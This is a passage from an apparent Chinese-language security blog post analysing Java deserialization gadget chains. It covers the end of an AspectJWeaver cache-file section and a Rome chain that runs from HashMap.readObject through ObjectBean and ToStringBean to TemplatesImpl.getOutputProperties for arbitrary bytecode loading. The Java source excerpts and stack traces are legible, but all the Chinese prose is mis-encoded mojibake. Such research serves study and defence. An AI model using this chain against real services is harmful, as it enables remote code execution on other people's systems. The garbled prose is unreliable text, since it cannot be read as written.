class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            path = writeToPath((String) key, valueBytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.put(key, path);</span><br><span class="line">        storeMap(); <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        trace.error(<span class="string">&quot;Error inserting in cache: key:&quot;</span>+key.toString() + <span class="string">&quot;; value:&quot;</span>+value.toString(), e);</span><br><span class="line">        Dump.dumpWithException(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>storeMap</code> å°†è‡ªèº«åºåˆ—åŒ–ç»“æœä¿å­˜åˆ°åŒç›®å½•ä¸‹çš„ <code>cache.idx</code> æ–‡ä»¶ä¸­ï¼Œä¸è¿‡éœ€è¦æ»¡è¶³ <code>(now - lastStored ) &lt; storingTimer</code> æ¡ä»¶ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CACHENAMEIDX</span> <span class="operator">=</span> <span class="string">&quot;cache.idx&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">long</span> <span class="variable">lastStored</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> storingTimer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">storeMap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    <span class="keyword">if</span> ((now - lastStored ) &lt; storingTimer)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(folder + File.separator + CACHENAMEIDX);;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        <span class="comment">// Deserialize the object</span></span><br><span class="line">        out.writeObject(<span class="built_in">this</span>);</span><br><span class="line">        out.close();</span><br><span class="line">        lastStored = now;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        trace.error(<span class="string">&quot;Error storing cache; cache file:&quot;</span>+file.getAbsolutePath(), e);</span><br><span class="line">        Dump.dumpWithException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæˆ‘ä»¬å°† <code>storingTimer</code> è®¾ç½®çš„è¶³å¤Ÿå¤§ï¼ˆæ¯”å¦‚ <code>0x7fffffff</code>ï¼‰ï¼Œè¿™æ ·çš„è¯ <code>cache.idx</code> æ–‡ä»¶ä¸­å°±ä¸ä¼šå†™å…¥åºåˆ—åŒ–æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ä»»æ„æ–‡ä»¶å†™å¯ä»¥å‘ <code>cache.idx</code> æ–‡ä»¶å†™å…¥å…¶ä»–åºåˆ—åŒ–æ•°æ®ã€‚</p>
<p>è€Œæ—¢ç„¶ <code>cache.idx</code> æ–‡ä»¶ä¿å­˜åºåˆ—åŒ–æ•°æ®ï¼Œé‚£ä¹ˆä¸€å®šæœ‰å…¶ä»–åœ°æ–¹ä¼šè¯»å–å¹¶ååºåˆ—åŒ–è¯¥æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚æ¯”å¦‚ <code>org.aspectj.weaver.tools.cache.SimpleCache.StoreableCachingMap#init</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> StoreableCachingMap <span class="title function_">init</span><span class="params">(String folder)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> init(folder,DEF_STORING_TIMER);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> StoreableCachingMap <span class="title function_">init</span><span class="params">(String folder, <span class="type">int</span> storingTimer)</span> &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(folder + File.separator + CACHENAMEIDX);</span><br><span class="line">    <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">            <span class="comment">// Deserialize the object</span></span><br><span class="line">            <span class="type">StoreableCachingMap</span> <span class="variable">sm</span> <span class="operator">=</span> (StoreableCachingMap) in.readObject();</span><br><span class="line">            sm.initTrace();</span><br><span class="line">            in.close();</span><br><span class="line">            <span class="keyword">return</span> sm;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Trace</span> <span class="variable">trace</span> <span class="operator">=</span> TraceFactory.getTraceFactory().getTrace(StoreableCachingMap.class);</span><br><span class="line">            trace.error(<span class="string">&quot;Error reading Storable Cache&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StoreableCachingMap</span>(folder,storingTimer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸è¿‡è¿™ä¸ªç‚¹è¿˜æ˜¯æ¯”è¾ƒé¸¡è‚‹ã€‚</p>
<h1 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h1><p>ROME æ˜¯ä¸€ä¸ªç”¨æ¥<strong>è§£æ&#x2F;ç”Ÿæˆ RSS ä¸ Atom è®¢é˜…æº</strong>çš„ Java åº“ï¼ˆæ¡†æ¶åå°±å« ROMEï¼‰ã€‚å®ƒæä¾›ç»Ÿä¸€çš„ APIï¼ŒæŠŠå„ç§ RSSï¼ˆ0.90&#x2F;0.91&#x2F;0.92&#x2F;0.93&#x2F;0.94&#x2F;1.0&#x2F;2.0ï¼‰ä¸ Atomï¼ˆ0.3&#x2F;1.0ï¼‰æ ¼å¼è¯»æˆ Java å¯¹è±¡ï¼Œæˆ–ä» Java å¯¹è±¡å†™å›æˆè®¢é˜…æºï¼›å¹¶æœ‰æ‰©å±•æ¨¡å—ï¼ˆMediaRSSã€GeoRSSã€OPML ç­‰ï¼‰ã€‚</p>
<blockquote>
<p>å¾ˆå¤šç½‘ç«™&#x2F;åšå®¢ä¼šæŠŠâ€œæœ€æ–°æ–‡ç« åˆ—è¡¨â€ä»¥ä¸€ç§æœºå™¨å¯è¯»çš„ <strong>XML</strong> æ ¼å¼å¯¹å¤–å‘å¸ƒï¼Œå¸¸è§æœ‰ <strong>RSS</strong> å’Œ <strong>Atom</strong> ä¸¤ç§ã€‚è®¢é˜…å™¨ï¼ˆæ¯”å¦‚ Feedlyï¼‰è®¢é˜…è¿™ä¸ªåœ°å€ï¼Œå°±èƒ½è‡ªåŠ¨çœ‹åˆ°ç½‘ç«™çš„æ–°å†…å®¹ã€‚è¿™ä¸ª XML å°±å«â€œè®¢é˜…æº&#x2F;Feedâ€ã€‚</p>
</blockquote>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br></pre></td></tr></table></figure></div>

<h2 id="ååºåˆ—åŒ–é“¾"><a href="#ååºåˆ—åŒ–é“¾" class="headerlink" title="ååºåˆ—åŒ–é“¾"></a>ååºåˆ—åŒ–é“¾</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:507)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:137)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:116)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.toString(ObjectBean.java:120)</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.beanHashCode(EqualsBean.java:193)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.hashCode(ObjectBean.java:110)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:338)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1397)</span><br></pre></td></tr></table></figure></div>

<h3 id="åŸç†åˆ†æ-5"><a href="#åŸç†åˆ†æ-5" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³å¿ƒçš„æ˜¯ <code>com.sun.syndication.feed.impl.ObjectBean</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Cloneable &#123;</span><br><span class="line">    <span class="keyword">private</span> EqualsBean _equalsBean;</span><br><span class="line">    <span class="keyword">private</span> ToStringBean _toStringBean;</span><br><span class="line">    <span class="keyword">private</span> CloneableBean _cloneableBean;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass,Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(beanClass,obj,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;</span><br><span class="line">        _equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass,obj);</span><br><span class="line">        _toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass,obj);</span><br><span class="line">        _cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj,ignoreProperties);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<h4 id="toString-â†’-getter"><a href="#toString-â†’-getter" class="headerlink" title="toString â†’ getter"></a>toString â†’ getter</h4><p>åœ¨æˆ‘ä»¬è°ƒç”¨ <code>ObjectBean</code> çš„ <code>toString</code> æ–¹æ³•æ—¶ä¼šè§¦å‘å…¶ <code>_toStringBean</code> æˆå‘˜çš„ <code>toString</code> æ–¹æ³•ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:137)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:116)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.toString(ObjectBean.java:120)</span><br></pre></td></tr></table></figure></div>

<p><code>ToStringBean#toString</code> ä¼šéå†å¹¶è°ƒç”¨ <code>_beanClass</code> çš„æ‰€æœ‰æ»¡è¶³ä¸‹é¢æ¡ä»¶çš„ getter æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸æ˜¯ç»§æ‰¿è‡ª <code>java.lang.Object</code> ç±»çš„ getter æ–¹æ³•ï¼Œè¿™é‡Œä¸»è¦æ˜¯ <code>getClass</code>ã€‚</li>
<li>getter æ–¹æ³•å¿…é¡»æ— å‚ã€‚</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åå°„è°ƒç”¨ getter æ—¶ä½¿ç”¨çš„â€œæ— å‚å ä½æ•°ç»„â€ï¼Œé¿å…æ¯æ¬¡ new Object[0]</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] NO_PARAMS = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›æ„é€ æ—¶ä¼ å…¥ bean çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> prefix å±æ€§åå‰ç¼€ï¼ˆä¸€èˆ¬ç”¨äºè¾“å‡ºæ—¶æ ‡è¯† bean åç§°ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> è¯¥ bean çš„â€œå±æ€§=å€¼â€åˆ—è¡¨å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// é€šè¿‡å†…çœæ‹¿åˆ° beanClass çš„æ‰€æœ‰å±æ€§æè¿°ï¼ˆåŒ…å«å±æ€§åä¸è¯»/å†™æ–¹æ³•ï¼‰</span></span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp;                               <span class="comment">// å¿…é¡»å­˜åœ¨ getter</span></span><br><span class="line">                    pReadMethod.getDeclaringClass() != Object.class &amp;&amp;   <span class="comment">// è¿‡æ»¤æ‰ Object çš„æ–¹æ³•ï¼ˆå¦‚ getClassï¼‰</span></span><br><span class="line">                    pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;       <span class="comment">// ä»…æ¥å—æ— å‚ getter</span></span><br><span class="line">                    <span class="comment">// åå°„è°ƒç”¨ getter å–å±æ€§å€¼</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(_obj, NO_PARAMS);</span><br><span class="line">                    <span class="comment">// æŒ‰â€œå‰ç¼€.å±æ€§å=å€¼â€çš„å½¢å¼è¿½åŠ åˆ° StringBuffer</span></span><br><span class="line">                    printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="comment">// ä»»ä½•å†…çœ/åå°„å¼‚å¸¸éƒ½é™„å¸¦ç±»åå†™å…¥è¾“å‡ºï¼Œä¾¿äºæ’æŸ¥</span></span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + _obj.getClass()</span><br><span class="line">                  + <span class="string">&quot;.toString(): &quot;</span> + ex.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçš„ <code>_beanClass</code> å®é™…ä¸Šå°±æ˜¯æ¥è‡ªäº <code>ObjectBean</code> çš„ <code>beanClass</code> å‚æ•°ï¼Œè€Œ <code>_obj</code> æ¥è‡ªäº <code>ObjectBean</code> çš„ <code>obj</code> å‚æ•°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> beanClass è¦æ‰«æå±æ€§çš„ç±»å‹ï¼ˆé€šå¸¸æ˜¯æ¥å£æˆ–ç±»æœ¬èº«ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj       å…·ä½“çš„ bean å®ä¾‹ï¼Œç”¨äºå®é™…è¯»å–å±æ€§å€¼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ToStringBean</span><span class="params">(Class beanClass, Object obj)</span> &#123;</span><br><span class="line">    _beanClass = beanClass;  <span class="comment">// ä¿å­˜è¦è¢«å†…çœçš„ç±»å‹</span></span><br><span class="line">    _obj = obj;              <span class="comment">// ä¿å­˜å®é™…çš„ç›®æ ‡å¯¹è±¡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="hashCode-â†’-toString"><a href="#hashCode-â†’-toString" class="headerlink" title="hashCode â†’ toString"></a>hashCode â†’ toString</h4><p><code>ObjectBean#hashCode</code> ä¼šè°ƒç”¨ <code>_equalsBean</code> çš„ <code>beanHashCode</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>com.sun.syndication.feed.impl.EqualsBean#beanHashCode</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>_obj</code> çš„ <code>toString</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _obj.toString().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œ <code>EqualsBean#_obj</code> æ¥è‡ªäº <code>ObjectBean</code> çš„ <code>obj</code> å‚æ•°ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">EqualsBean</span><span class="params">(Class beanClass,Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!beanClass.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(obj.getClass()+<span class="string">&quot; is not instance of &quot;</span>+beanClass);</span><br><span class="line">    &#125;</span><br><span class="line">    _beanClass = beanClass;</span><br><span class="line">    _obj = obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨ä»£ç -6"><a href="#åˆ©ç”¨ä»£ç -6" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><p>æ ¹æ®å‰é¢çš„åˆ†æï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>ObjectBean</code> å®ç°ä» <code>hashCode</code> åˆ°ä»»æ„å¯¹è±¡çš„ getter æ–¹æ³•è°ƒç”¨ã€‚å…·ä½“åšæ³•ä¸ºï¼š</p>
<ol>
<li>Hash ç±»å‹çš„å®¹å™¨ä¸­å­˜æ”¾ <code>ObjectBean</code> ç±»å‹çš„ <code>outerBean</code>ï¼Œç¡®ä¿ååºåˆ—åŒ–çš„æ—¶å€™èƒ½è§¦å‘ <code>outerBean</code> çš„ <code>hashCode</code> æ–¹æ³•ã€‚</li>
<li><code>outerBean</code> ä¸­å­˜æ”¾ <code>ObjectBean</code> ç±»å‹çš„ <code>innerBean</code>ï¼Œå¤–å±‚çš„ <code>outerBean</code> çš„ <code>hashCode</code> æ–¹æ³•èƒ½è§¦å‘å†…å±‚ <code>innerBean</code> çš„ <code>toString</code> æ–¹æ³•ã€‚</li>
<li>å†…å±‚çš„ <code>innerBean</code> å­˜æ”¾éœ€è¦è°ƒç”¨ getter æ–¹æ³•çš„å¯¹è±¡ã€‚</li>
</ol>
<h4 id="å­—èŠ‚ç åŠ è½½"><a href="#å­—èŠ‚ç åŠ è½½" class="headerlink" title="å­—èŠ‚ç åŠ è½½"></a>å­—èŠ‚ç åŠ è½½</h4><p>ç”±äºèƒ½ä»»æ„ getter æ–¹æ³•è°ƒç”¨ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°åˆ©ç”¨ <code>TemplatesImpl</code> çš„ <code>getOutputProperties</code> æ–¹æ³•å®ç°ä»»æ„å­—èŠ‚ç åŠ è½½ã€‚</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ä¸ JDK7u21 ç±»ä¼¼ï¼Œ<code>innerBean</code> åœ¨åŒ…è£… <code>TemplatesImpl</code> æ—¶ <code>beanClass</code> å‚æ•°éœ€è¦ä¼  <code>javax.xml.transform.Templates</code> è€Œä¸æ˜¯å…·ä½“çš„ <code>TemplatesImpl.class</code>ã€‚è¿™æ˜¯å› ä¸º <code>Templates</code> ä½œä¸ºæ¥å£åªå®šä¹‰äº† <code>newTransformer</code> å’Œ <code>getOutputProperties</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Templates</span> &#123;</span><br><span class="line"></span><br><span class="line">    Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException;</span><br><span class="line"></span><br><span class="line">    Properties <span class="title function_">getOutputProperties</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤è°ƒç”¨çš„ getter æ–¹æ³•åªèƒ½æ˜¯ <code>getOutputProperties</code>ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥æ­£å¸¸è§¦å‘ <code>TemplatesImpl</code> çš„ä»»æ„å­—èŠ‚ç åŠ è½½çš„åˆ©ç”¨é“¾ã€‚</p>
<p>è€Œ <code>TemplatesImpl.class</code> è¿”å›çš„ç¬¬ä¸€ä¸ªæ–¹æ³•å¤§æ¦‚ç‡ä¸èƒ½è§¦å‘ <code>TemplatesImpl</code> çš„ä»»æ„å­—èŠ‚ç åŠ è½½çš„åˆ©ç”¨é“¾ï¼Œè€Œæ˜¯è°ƒç”¨åˆ° <code>getStylesheetDOM</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">ThreadLocal</span> <span class="variable">_sdom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> DOM <span class="title function_">getStylesheetDOM</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (DOM)_sdom.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

